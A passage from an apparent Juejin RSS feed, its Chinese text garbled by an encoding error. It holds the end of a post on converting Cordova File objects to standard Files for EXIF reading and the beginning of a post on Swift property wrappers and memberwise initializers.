            <span class="hljs-keyword">const</span> exifData = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">readExif</span>(processedFile);
            <span class="hljs-keyword">return</span> {
                <span class="hljs-attr">file</span>: processedFile,
                <span class="hljs-attr">exif</span>: exifData,
                <span class="hljs-attr">localURL</span>: processedFile.<span class="hljs-property">localURL</span> <span class="hljs-comment">// ä¿ç•™ Cordova è·¯å¾„</span>
            };
        }
        
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">file</span>: processedFile };
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">readExif</span>(<span class="hljs-params">file</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
            <span class="hljs-variable constant_">EXIF</span>.<span class="hljs-title function_">getData</span>(file, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                <span class="hljs-title function_">resolve</span>(<span class="hljs-variable constant_">EXIF</span>.<span class="hljs-title function_">getAllTags</span>(<span class="hljs-variable language_">this</span>));
            });
        });
    }
}
</code></pre>
<h4 data-id="heading-13">æ–¹æ¡ˆ3ï¼šå®æˆ˜åº”ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">PhotoUploader</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePhotoSelect</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">cordovaFile</span>) =&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ğŸš€ æ™ºèƒ½å¤„ç†ï¼šè‡ªåŠ¨è½¬æ¢å¹¶ä¿ç•™ Cordova ä¼˜åŠ¿</span>
            <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title class_">IntelligentFileProcessor</span>.<span class="hljs-title function_">processImageWithExif</span>(cordovaFile);
            
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ–‡ä»¶ä¿¡æ¯:'</span>, {
                <span class="hljs-attr">name</span>: result.<span class="hljs-property">file</span>.<span class="hljs-property">name</span>,
                <span class="hljs-attr">type</span>: result.<span class="hljs-property">file</span>.<span class="hljs-property">type</span>,
                <span class="hljs-attr">size</span>: result.<span class="hljs-property">file</span>.<span class="hljs-property">size</span>,
                <span class="hljs-attr">localURL</span>: result.<span class="hljs-property">localURL</span>, <span class="hljs-comment">// Cordova æœ¬åœ°è·¯å¾„</span>
                <span class="hljs-attr">exif</span>: result.<span class="hljs-property">exif</span>          <span class="hljs-comment">// ç°åœ¨å¯ä»¥è¯»å– EXIF äº†ï¼</span>
            });
            
            <span class="hljs-comment">// ä½¿ç”¨æ ‡å‡† File è¿›è¡Œåç»­å¤„ç†ï¼ˆæ”¯æŒæ‰€æœ‰ Web APIï¼‰</span>
            <span class="hljs-keyword">const</span> optimizedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">optimizeImage</span>(result.<span class="hljs-property">file</span>);
            
            <span class="hljs-comment">// éœ€è¦æ—¶ä½¿ç”¨ Cordova æœ¬åœ°è·¯å¾„</span>
            <span class="hljs-keyword">if</span> (result.<span class="hljs-property">localURL</span>) {
                <span class="hljs-keyword">await</span> <span class="hljs-title function_">uploadViaCordovaPath</span>(result.<span class="hljs-property">localURL</span>);
            }
            
        } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'æ–‡ä»¶å¤„ç†å¤±è´¥:'</span>, error);
        }
    };
    
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
            <span class="hljs-attr">type</span>=<span class="hljs-string">"file"</span> 
            <span class="hljs-attr">accept</span>=<span class="hljs-string">"image/*"</span>
            <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> handlePhotoSelect(e.target.files[0])}
        /&gt;</span>
    );
}
</code></pre>
<h3 data-id="heading-14">ğŸ¯ æœ€ä½³å®è·µæŒ‡å—</h3>
<h4 data-id="heading-15">1. æ ¹æ®ä½¿ç”¨åœºæ™¯é€‰æ‹©ç­–ç•¥</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// åœºæ™¯ Aï¼šåªéœ€è¦æ–‡ä»¶å†…å®¹å’Œ Cordova è·¯å¾„</span>
<span class="hljs-function">function <span class="hljs-title">simpleFileHandler</span><span class="hljs-params">(cordovaFile)</span> </span>{
    <span class="hljs-keyword">return</span> {
        name: cordovaFile.name,
        localURL: cordovaFile.localURL, <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨ Cordova è·¯å¾„</span>
        size: cordovaFile.size
        <span class="hljs-comment">// ä¸éœ€è¦è½¬æ¢ä¸ºæ ‡å‡† File</span>
    };
}

<span class="hljs-comment">// åœºæ™¯ Bï¼šéœ€è¦ EXIF/IPTC æˆ– Web API å…¼å®¹æ€§</span>
<span class="hljs-function">async function <span class="hljs-title">advancedFileHandler</span><span class="hljs-params">(cordovaFile)</span> </span>{
    <span class="hljs-type">const</span> standardFile = await SmartFileBridge.<span class="hljs-built_in">toStandardFile</span>(cordovaFile);
    
    <span class="hljs-keyword">return</span> {
        file: standardFile,           <span class="hljs-comment">// æ ‡å‡† Fileï¼ˆæ”¯æŒ EXIFã€Web APIï¼‰</span>
        localURL: cordovaFile.localURL, <span class="hljs-comment">// ä¿ç•™ Cordova è·¯å¾„</span>
        start: cordovaFile.start,     <span class="hljs-comment">// ä¿ç•™ Cordova åˆ‡ç‰‡</span>
        end: cordovaFile.end
    };
}
</code></pre>
<h4 data-id="heading-16">2. æ€§èƒ½ä¼˜åŒ–å»ºè®®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ğŸš€ æŒ‰éœ€è½¬æ¢ï¼šä¸è¦ç›²ç›®è½¬æ¢æ‰€æœ‰æ–‡ä»¶</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceAwareProcessor</span> {
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">async</span> <span class="hljs-title function_">processBatch</span>(<span class="hljs-params">files, options = {}</span>) {
        <span class="hljs-keyword">const</span> { needExif = <span class="hljs-literal">false</span>, needWebAPI = <span class="hljs-literal">false</span> } = options;
        
        <span class="hljs-keyword">const</span> results = [];
        
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> file <span class="hljs-keyword">of</span> files) {
            <span class="hljs-comment">// å¿«é€Ÿè·¯å¾„ï¼šä¸éœ€è¦æ ‡å‡† File åŠŸèƒ½</span>
            <span class="hljs-keyword">if</span> (!needExif &amp;&amp; !needWebAPI) {
                results.<span class="hljs-title function_">push</span>({
                    <span class="hljs-attr">file</span>: file, <span class="hljs-comment">// ä¿æŒåŸæ ·</span>
                    <span class="hljs-attr">localURL</span>: file.<span class="hljs-property">localURL</span>
                });
                <span class="hljs-keyword">continue</span>;
            }
            
            <span class="hljs-comment">// æ…¢é€Ÿè·¯å¾„ï¼šéœ€è¦å®Œæ•´åŠŸèƒ½</span>
            <span class="hljs-keyword">const</span> converted = <span class="hljs-keyword">await</span> <span class="hljs-title class_">SmartFileBridge</span>.<span class="hljs-title function_">toStandardFile</span>(file);
            results.<span class="hljs-title function_">push</span>({
                <span class="hljs-attr">file</span>: converted,
                <span class="hljs-attr">localURL</span>: file.<span class="hljs-property">localURL</span>
            });
        }
        
        <span class="hljs-keyword">return</span> results;
    }
}
</code></pre>
<h3 data-id="heading-17">ğŸ¤” è®¾è®¡å“²å­¦åæ€</h3>
<h4 data-id="heading-18">Cordova çš„è®¾è®¡å–èˆ</h4>
<ul>
<li><strong>å¾—</strong>ï¼šè·å¾—äº†æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿè®¿é—®èƒ½åŠ›ï¼ˆlocalURLï¼‰</li>
<li><strong>å¤±</strong>ï¼šå¤±å»äº†æ•´ä¸ª Web ç”Ÿæ€å…¼å®¹æ€§</li>
<li><strong>é—®é¢˜</strong>ï¼šæ²¡æœ‰æä¾›å¹³æ»‘çš„è¿ç§»è·¯å¾„</li>
</ul>
<h4 data-id="heading-19">ç†æƒ³çš„è§£å†³æ–¹æ¡ˆåº”è¯¥æ˜¯</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ğŸ’­ ç†æƒ³ä¸­çš„è®¾è®¡</span>
<span class="hljs-keyword">const</span> cordovaFile = <span class="hljs-keyword">await</span> cordovaFS.getFile(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> standardFile = <span class="hljs-keyword">await</span> cordovaFile.toStandardFile(); <span class="hljs-comment">// æ˜¾å¼è½¬æ¢</span>
<span class="hljs-keyword">const</span> withExif = <span class="hljs-keyword">await</span> standardFile.readExif(); <span class="hljs-comment">// è·å¾— EXIF èƒ½åŠ›</span>
</code></pre>
<h3 data-id="heading-20">ğŸ æ€»ç»“</h3>
<p>Cordova File å¯¹è±¡çš„æ ¸å¿ƒçŸ›ç›¾åœ¨äºï¼š</p>
<ul>
<li><strong>æƒ³è¦ Cordova çš„ä¼˜åŠ¿</strong>ï¼ˆlocalURLï¼‰â†’ å¿…é¡»ç”¨ Cordova File</li>
<li><strong>æƒ³è¦ Web ç”Ÿæ€</strong>ï¼ˆEXIFã€æ ‡å‡† APIï¼‰â†’ å¿…é¡»è½¬æ¢ä¸ºæ ‡å‡† File</li>
</ul>
<p><strong>å®ç”¨å»ºè®®</strong>ï¼š</p>
<ol>
<li><strong>æ˜ç¡®éœ€æ±‚</strong>ï¼šç¡®å®šæ˜¯å¦éœ€è¦ EXIF/IPTC æˆ– Web API å…¼å®¹æ€§</li>
<li><strong>æŒ‰éœ€è½¬æ¢</strong>ï¼šä¸è¦ç›²ç›®è½¬æ¢ï¼Œæ ¹æ®ä½¿ç”¨åœºæ™¯å†³å®š</li>
<li><strong>ä¿ç•™ä¼˜åŠ¿</strong>ï¼šè½¬æ¢æ—¶ä¿ç•™ Cordova ç‰¹æœ‰çš„ localURL ç­‰å±æ€§</li>
<li><strong>æ¸è¿›è¿ç§»</strong>ï¼šæ–°é¡¹ç›®ä¼˜å…ˆè€ƒè™‘ Capacitor ç­‰ç°ä»£æ–¹æ¡ˆ</li>
</ol>
<p>è¿™åœº"ç¾éš¾"çš„æ•™è®­æ˜¯ï¼š<strong>æŠ€æœ¯é€‰å‹è¦åœ¨ç‰¹æ®Šéœ€æ±‚å’Œç”Ÿæ€å…¼å®¹æ€§ä¹‹é—´æ‰¾åˆ°å¹³è¡¡</strong>ã€‚Cordova ç»™äº†æˆ‘ä»¬æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„é’¥åŒ™ï¼Œä½†ä¹Ÿå…³ä¸Šäº† Web æ ‡å‡†çš„å¤§é—¨ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œæˆ‘ä»¬è¦å­¦ä¼šåŒæ—¶æ‹¿ç€ä¸¤æŠŠé’¥åŒ™ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Swift å±æ€§åŒ…è£…å™¨]]></title>    <link>https://juejin.cn/post/7600414546189467658</link>    <guid>https://juejin.cn/post/7600414546189467658</guid>    <pubDate>2026-01-29T08:49:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600414546189467658" data-draft-id="7600581247019106313" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Swift å±æ€§åŒ…è£…å™¨"/> <meta itemprop="keywords" content="Swift"/> <meta itemprop="datePublished" content="2026-01-29T08:49:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·46810455724"/> <meta itemprop="url" content="https://juejin.cn/user/2367689856916010"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Swift å±æ€§åŒ…è£…å™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2367689856916010/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·46810455724
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:49:40.000Z" title="Thu Jan 29 2026 08:49:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘ä»¬æ¥çœ‹ The Swift Programming Language (6.2.3) ä¸­çš„ä¾‹å­ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">@propertyWrapper</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">TwelveOrLess</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> number <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">var</span> wrappedValue: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">return</span> number }
        <span class="hljs-keyword">set</span> { number <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(newValue, <span class="hljs-number">12</span>) }
    }
}
</code></pre>
<p>ç»“æ„ TwelveOrLess æ˜¯å±æ€§åŒ…è£…å™¨ï¼Œå±æ€§åŒ…è£…å™¨å¯ä»¥æ˜¯ classã€struct å’Œ enumã€‚å±æ€§åŒ…è£…å™¨éœ€è¦æœ‰ä¸ªå±æ€§ wrappedValueï¼Œè¡¨ç¤ºè¢«åŒ…è£…çš„å€¼ã€‚TwelveOrLess çš„ wrappedValue å±æ€§æ˜¯è®¡ç®—å±æ€§ï¼Œè¯»å†™ç§æœ‰çš„å­˜å‚¨å±æ€§ numberï¼Œå…¶ setter ç¡®ä¿ number å°äºæˆ–ç­‰äº 12ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SmallRectangle</span> {
    <span class="hljs-meta">@TwelveOrLess</span> <span class="hljs-keyword">var</span> height: <span class="hljs-type">Int</span>
    <span class="hljs-meta">@TwelveOrLess</span> <span class="hljs-keyword">var</span> width: <span class="hljs-type">Int</span>
}
</code></pre>
<p>ç»“æ„ SmallRectangle åº”ç”¨åŒ…è£…å™¨ TwelveOrLess åˆ°å±æ€§ height å’Œ widthï¼Œç¼–è¯‘å™¨é‡å†™ä»£ç ä¸ºï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SmallRectangle</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> _height <span class="hljs-operator">=</span> <span class="hljs-type">TwelveOrLess</span>()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> _width <span class="hljs-operator">=</span> <span class="hljs-type">TwelveOrLess</span>()
    <span class="hljs-keyword">var</span> height: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">return</span> _height.wrappedValue }
        <span class="hljs-keyword">set</span> { _height.wrappedValue <span class="hljs-operator">=</span> newValue }
    }
    <span class="hljs-keyword">var</span> width: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">return</span> _width.wrappedValue }
        <span class="hljs-keyword">set</span> { _width.wrappedValue <span class="hljs-operator">=</span> newValue }
    }
}
</code></pre>
<p>ç”Ÿæˆ _height å’Œ _width å­˜å‚¨å±æ€§ï¼Œå­˜å‚¨åŒ…è£…å™¨ TwelveOrLess çš„å®ä¾‹ã€‚height å’Œ width æˆä¸ºè®¡ç®—å±æ€§ï¼Œè®¿é—® _height å’Œ _width çš„ wrappedValueã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f1b3195708c4f1181cd25b3806915fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NDY4MTA0NTU3MjQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770281383&amp;x-signature=vrGpv62QP6nrmqkWEIYwbibwQaM%3D" alt="v2-a712b4a4c7d80561227b6bc40f5c8608_1440w.png" loading="lazy"/></p>
<p>ç¼–è¯‘å™¨è¿˜ä¼šä¸º SmallRectangle ç”Ÿæˆ memberwise åˆå§‹åŒ–å™¨ï¼Œæ­¤æ—¶ç”Ÿæˆçš„åˆå§‹åŒ–å™¨ä¸º</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">init</span>(
    <span class="hljs-params">height</span>: <span class="hljs-type">TwelveOrLess</span> <span class="hljs-operator">=</span> <span class="hljs-type">TwelveOrLess</span>(),
    <span class="hljs-params">width</span>: <span class="hljs-type">TwelveOrLess</span> <span class="hljs-operator">=</span> <span class="hljs-type">TwelveOrLess</span>()
)
</code></pre>
<p>å‚æ•° height å’Œ width çš„ç±»å‹ä¸ºåŒ…è£…å™¨ç±»å‹ TwelveOrLessï¼ŒTwelveOrLess çš„åˆå§‹åŒ–å™¨ä¸ºé»˜è®¤åˆå§‹åŒ–å™¨ init()ã€‚
å¦‚æœ TwelveOrLess å¢åŠ åˆå§‹åŒ–å™¨ init(wrappedValue: Int)ï¼Œ</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">@propertyWrapper</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">TwelveOrLess</span> {   
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> number <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">init</span>(<span class="hljs-params">wrappedValue</span>: <span class="hljs-type">Int</span>) {
        <span class="hljs-keyword">self</span>.number <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(wrappedValue, <span class="hljs-number">12</span>)
    }

    <span class="hljs-keyword">var</span> wrappedValue: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">return</span> number }
        <span class="hljs-keyword">set</span> { number <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(newValue, <span class="hljs-number">12</span>) }
    }
}
</code></pre>
<p>åˆ™ SmallRectangle çš„åˆå§‹åŒ–å™¨ä¸º</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">init</span>(
    <span class="hljs-params">height</span>: <span class="hljs-type">Int</span>,
    <span class="hljs-params">width</span>: <span class="hljs-type">Int</span>
)
</code></pre>
<p>å‚æ•° height å’Œ width çš„ç±»å‹ä¸ºåŸå§‹ç±»å‹ Intã€‚</p>
<p>å¦‚æœ TwelveOrLess å¢åŠ åˆå§‹åŒ–å™¨ init()ï¼Œ</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">@propertyWrapper</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">TwelveOrLess</span> {   
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> number <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">init</span>() {
        number  <span class="hljs-operator">=</span> <span class="hljs-number">1</span>
    }
    
    <span class="hljs-keyword">init</span>(<span class="hljs-params">wrappedValue</span>: <span class="hljs-type">Int</span>) {
        <span class="hljs-keyword">self</span>.number <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(wrappedValue, <span class="hljs-number">12</span>)
    }

    <span class="hljs-keyword">var</span> wrappedValue: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">return</span> number }
        <span class="hljs-keyword">set</span> { number <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(newValue, <span class="hljs-number">12</span>) }
    }
}
</code></pre>
<p>åˆ™ SmallRectangle çš„åˆå§‹åŒ–å™¨ä¸º</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">init</span>(
    <span class="hljs-params">height</span>: <span class="hljs-type">TwelveOrLess</span> <span class="hljs-operator">=</span> <span class="hljs-type">TwelveOrLess</span>(),
    <span class="hljs-params">width</span>: <span class="hljs-type">TwelveOrLess</span> <span class="hljs-operator">=</span> <span class="hljs-type">TwelveOrLess</span>()
)
</code></pre>
<p>æ­¤æ—¶æƒ³è®© SmallRectangle çš„ memberwise åˆå§‹åŒ–å™¨å‚æ•°ç±»å‹ä¸ºåŸå§‹ç±»å‹ Intï¼Œéœ€è¦ä¿®æ”¹ä¸º</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SmallRectangle</span> {
    <span class="hljs-meta">@TwelveOrLess</span> <span class="hljs-keyword">var</span> height: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>
    <span class="hljs-meta">@TwelveOrLess</span> <span class="hljs-keyword">var</span> width: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>
}
</code></pre>
<p>ç¼–è¯‘å™¨ç”Ÿæˆçš„ä»£ç ä¸º</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SmallRectangle</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> _height <span class="hljs-operator">=</span> <span class="hljs-type">TwelveOrLess</span>(wrappedValue: <span class="hljs-number">1</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> _width <span class="hljs-operator">=</span> <span class="hljs-type">TwelveOrLess</span>(wrappedValue: <span class="hljs-number">1</span>)
    <span class="hljs-keyword">var</span> height: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">return</span> _height.wrappedValue }
        <span class="hljs-keyword">set</span> { _height.wrappedValue <span class="hljs-operator">=</span> newValue }
    }
    <span class="hljs-keyword">var</span> width: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">get</span> { <span class="hljs-keyword">return</span> _width.wrappedValue }
        <span class="hljs-keyword">set</span> { _width.wrappedValue <span class="hljs-operator">=</span> newValue }
    }
    
    <span class="hljs-keyword">init</span>(<span class="hljs-params">height</span>: <span class="hljs-type">Int</span>, <span class="hljs-params">width</span>: <span class="hljs-type">Int</span>) {
        <span class="hljs-keyword">self</span>.height <span class="hljs-operator">=</span> height
        <span class="hljs-keyword">self</span>.width <span class="hljs-operator">=</span> width
    }
}
</code></pre>
<p>æ€»ç»“ï¼šå¯¹ä¸€ä¸ª struct çš„æŸä¸ªå±æ€§åº”ç”¨åŒ…è£…å™¨ï¼Œè¦ä½¿ memberwise åˆå§‹åŒ–å™¨å¯¹åº”å‚æ•°ç±»å‹ä¸ºåŸå§‹ç±»å‹ï¼Œéœ€è¦å¦‚ä¸‹æ¡ä»¶ä¹‹ä¸€ï¼Œ</p>
<ul>
<li>å±æ€§åŒ…è£…å™¨æœ‰åˆå§‹åŒ–å™¨ init(wrappedValue:)ï¼Œå¹¶ä¸”æ²¡æœ‰ init()</li>
<li>å±æ€§æœ‰åˆå§‹å€¼ï¼Œåƒ @TwelveOrLess var height: Int = 1</li>
</ul>
<p>å¦åˆ™ï¼Œmemberwise åˆå§‹åŒ–å™¨å‚æ•°ç±»å‹ä¸ºåŒ…è£…å™¨ç±»å‹ã€‚</p>
<p>é™¤äº†è¢«åŒ…è£…çš„å€¼ï¼Œå±æ€§åŒ…è£…å™¨å¯ä»¥é€šè¿‡å®šä¹‰ä¸€ä¸ª projected value æš´éœ²é¢å¤–çš„åŠŸèƒ½ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">@propertyWrapper</span>
